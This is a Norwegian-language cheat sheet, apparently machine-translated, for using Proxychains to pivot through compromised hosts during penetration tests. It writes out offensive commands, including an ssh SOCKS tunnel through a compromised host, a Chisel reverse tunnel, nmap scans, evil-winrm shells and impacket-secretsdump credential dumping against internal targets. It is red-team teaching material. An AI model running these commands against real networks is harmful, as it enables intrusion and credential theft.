<!-- language-home-navigation -->
[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)

---


# ⛓️ Proxychains - komplett jukseark

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗   ██╗ ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗
  ██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝╚██╗ ██╔╝██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝
  ██████╔╝██████╔╝██║   ██║ ╚███╔╝  ╚████╔╝ ██║     ███████║███████║██║██╔██╗ ██║███████╗
  ██╔═══╝ ██╔══██╗██║   ██║ ██╔██╗   ╚██╔╝  ██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║
  ██║     ██║  ██║╚██████╔╝██╔╝ ██╗   ██║   ╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝
       Force Any TCP Connection Through SOCKS4, SOCKS5, and HTTP Proxies
```
<p align="center">
  <img src="https://img.shields.io/badge/Proxychains-Proxychains--NG-blue?style=for-the-badge" alt="Proxychains">
  <img src="https://img.shields.io/badge/Category-Pivoting_&_Tunneling-orange?style=for-the-badge" alt="Driving og tunneling">
  <img src="https://img.shields.io/badge/Protocols-SOCKS4_SOCKS5_HTTP-green?style=for-the-badge" alt="Protokoller">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="License GPLv2">
</p>

<p align="center">
  <b>🌐 Ruter standard Linux CLI-nettverksverktøy dynamisk gjennom multi-hop SOCKS og HTTP proxyer via LD_PRELOAD</b>
</p>

---

## 📋 Innholdsfortegnelse

- [Oversikt og hvordan proxykjeder fungerer](#-oversikt--hvordan-proxykjeder-fungerer)
- [Installasjon](#-installasjon)
- [Konfigurasjonsfiler og oppslagshierarki](#-konfigurasjonsfiler--oppslagshierarki)
- [Forklart kjedemoduser](#-kjedemoduser-forklart)
  - [`dynamic_chain` (anbefalt)](#dynamic_chain-recommended)
  - [`strict_chain`](#strict_chain)
  - [`round_robin_chain`](#round_robin_chain)
  - [`random_chain`](#random_chain)
- [DNS Leaks Prevention (`proxy_dns`)](#-dns-leaks-prevention-proxy_dns)
- [Konfigurerer proxy-lister](#-configuring-proxy-lister)
- [Drivende arbeidsflyter](#-pivoterende arbeidsflyter)
  - [SSH Dynamic SOCKS Proxy (`ssh -D`)](#ssh-dynamic-socks-proxy-ssh--d)
  - [Meisel & Ligolo-ng SOCKS Relay](#meisel--ligolo-ng-sokker-relé)
- [Tool Integration & Gotchas](#-tool-integration--gotchas)
  - [Nmap with Proxychains (Why `-sS` Fails)](#nmap-with-proxychains-why--ss-fails)
  - [Active Directory-verktøy (NetExec, Evil-WinRM, Impacket)](#active-directory-tools-netexec-evil-winrm-impacket)
- [Hurtigreferansetabell](#-hurtigreferansetabell)
– [Defensive Considerations & OPSEC](#-defensive-considerations--opsec)
– [Juridisk ansvarsfraskrivelse](#-juridisk ansvarsfraskrivelse)

---

## 🎯 Oversikt og hvordan proxykjeder fungerer

**Proxychains** (moderne aktiv gaffel: **Proxychains-NG** / `proxychains4`) lar deg kjøre enhver dynamisk kommando gjennom enkeltkjedede SOCKS4-, SOCKS5- eller HTTP(S)-proxyer.

Den fungerer ved å forhåndslaste et tilpasset hook-bibliotek (`libproxychains4.so`) ved å bruke den dynamiske linkermekanismen (`LD_PRELOAD`). Dette fanger opp socket API-anrop (`connect()`, `gethostbyname()`) laget av målapplikasjoner og omdirigerer deres TCP-trafikk til den konfigurerte proxy-kjeden på en transparent måte.

---

## 📥 Installasjon
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y proxychains4

# Arch Linux
sudo pacman -S proxychains-ng

# macOS (Homebrew)
brew install proxychains-ng
```
---

## ⚙️ Konfigurasjonsfiler og oppslagshierarki

Proxychains søker etter konfigurasjonsfilen i følgende strenge prioritetsrekkefølge:

1. Sti satt i `PROXYCHAINS_CONF_FILE` miljøvariabel.
2. Fil sendt via `-f`-flagget (`proxychains4 -f ./myproxy.conf <command>`).
3. `./proxychains.conf` i gjeldende arbeidskatalog.
4. `$(HOME)/.proxychains/proxychains.conf`.
5. `/etc/proxychains4.conf` (Systemstandard).

---

## 🔗 Kjedemoduser forklart

Rediger `/etc/proxychains4.conf` for å velge kjederutingalgoritmen:

### `dynamic_chain` (anbefalt)
Hopper over døde proxyer i listen automatisk uten å avbryte tilkoblingen. Hvis Proxy #1 er oppe, Proxy #2 er nede, og Proxy #3 er oppe, kjører ruter gjennom 1 -> 3.
```ini
dynamic_chain
# strict_chain
```
### `strict_chain`
Følger strengt den konfigurerte proxy-rekkefølgen. Hvis en proxy i kjeden svikter eller går ut, blir hele tilkoblingen avvist.
```ini
strict_chain
```
### `round_robin_chain`
Går gjennom proxy-listen sekvensielt for hver ny tilkoblingsforespørsel.
```ini
round_robin_chain
chain_len = 2
```
### `random_chain`
Velger tilfeldig proxyer fra listen opp til `chain_len`.

---

## 🛡️ Forebygging av DNS-lekkasjer (`proxy_dns`)

En av de farligste OPSEC-feilene under ekstern rekognosering eller intern pivotering er lekkasje av DNS-spørringer til den lokale ISPen eller målgatewayen.

Sørg for at `proxy_dns` er aktiv i `/etc/proxychains4.conf`:
```ini
# Proxy all DNS requests through SOCKS5 proxy
proxy_dns

# Suppress annoying hook library stdout logs
quiet_mode
```
---

## 📝 Konfigurere proxy-lister

Nederst i `/etc/proxychains4.conf`, under `[ProxyList]`:
```ini
[ProxyList]
# Protocol   IP               Port   [Username]  [Password]
socks5       127.0.0.1        1080
socks4       192.168.1.100    1080
http         10.10.10.50      8080   admin       SecretPass123
```
---

## 🚀 Pivoterende arbeidsflyter

### SSH Dynamic SOCKS Proxy (`ssh -D`)
```bash
# 1. Open background dynamic SOCKS5 proxy on local port 1080 through compromised pivot host
ssh -f -N -D 127.0.0.1:1080 user@10.10.10.50

# 2. Add entry to /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

# 3. Access internal machines unreachable directly from attacker box
proxychains4 curl http://172.16.20.10
```
### Meisel & Ligolo-ng SOCKS Stafett

Når du kjører Chisel klient-server tunneler:
```bash
# Connect Chisel client with reverse SOCKS
chisel client 10.10.14.5:8000 R:1080:socks

# Route tools through Chisel tunnel
proxychains4 crackmapexec smb 172.16.50.0/24
```
---

## ⚠️ Verktøyintegrasjon og Gotchas

### Nmap with Proxychains (Hvorfor `-sS` mislykkes)

> [!ADVARSEL]
> SOCKS-proxyer støtter kun etablerte TCP-økter. **SYN Stealth Scans (`-sS`) vil mislykkes eller henge** fordi de krever rå socket-manipulering støttes ikke over SOCKS!
```bash
# Correct Nmap command with Proxychains (Full TCP Connect, No Ping, No DNS)
proxychains4 nmap -sT -Pn -n -sV -p 80,443,445,3389 172.16.20.10

# Scan Top 100 ports over proxy
proxychains4 nmap -sT -Pn -n --top-ports 100 172.16.20.10
```
### Active Directory-verktøy (NetExec, Evil-WinRM, Impacket)
```bash
# SMB enumeration through internal pivot
proxychains4 nxc smb 172.16.20.10 -u Administrator -p 'Password123'

# WinRM shell through proxychains
proxychains4 evil-winrm -i 172.16.20.10 -u Administrator -p 'Password123'

# Impacket secretsdump over SOCKS proxy
proxychains4 impacket-secretsdump domain.local/Administrator:Pass@172.16.20.10 -no-pass
```
---

## ⚡ Hurtigreferansetabell

| Mål | Kommando |
|----------------|--------|
| **Kjør kommando via proxy** | `proxychains4 <command> [args]` |
| **Egendefinert konfigurasjonsfil** | `proxychains4 -f ./custom.conf <command>` |
| **Rolig utførelse (ingen banner)** | `proxychains4 -q <command>` |
| **TCP-skanning internt mål** | `proxychains4 nmap -sT -Pn -n -p 80,445 <IP>` |
| **Intern nettforespørsel** | `proxychains4 curl -i http://<INTERNAL_IP>` |
| **Intern SQLMap-test** | `proxychains4 sqlmap -u "http://<IP>/id=1" --batch` |
| **Intern NetExec-sonde** | `proxychains4 nxc smb <SUBNET>/24` |

---

## 🛡️ Defensive betraktninger og OPSEC

1. **DNS-lekkasjer:** Hvis `proxy_dns` blir kommentert ut, vil systemet ditt løse vertsnavn via lokal DNS, og varsle Blue Teams om målrettede vertsnavn.
2. **Hastighet og ventetid:** Å lenke sammen flere proxyer gir tur-retur-tid (RTT). Angi rimelige tidsavbrudd (`tcp_read_time_out 15000`, `tcp_connect_time_out 8000`).
3. **Statiske binærfiler:** Statisk kompilerte binærfiler (f.eks. Go/Rust-binærfiler som ikke kobler til `libc.so`) omgår `LD_PRELOAD`-kroker og vil ikke bli rutet gjennom proxykjeder.

---

## ⚠️ Juridisk ansvarsfraskrivelse

> [!FORSIKTIG]
> Dette juksearket er kun ment for autorisert penetrasjonstesting, Red Team-engasjementer og pedagogisk forskning. Å dirigere trafikk uten autorisasjon er strengt forbudt.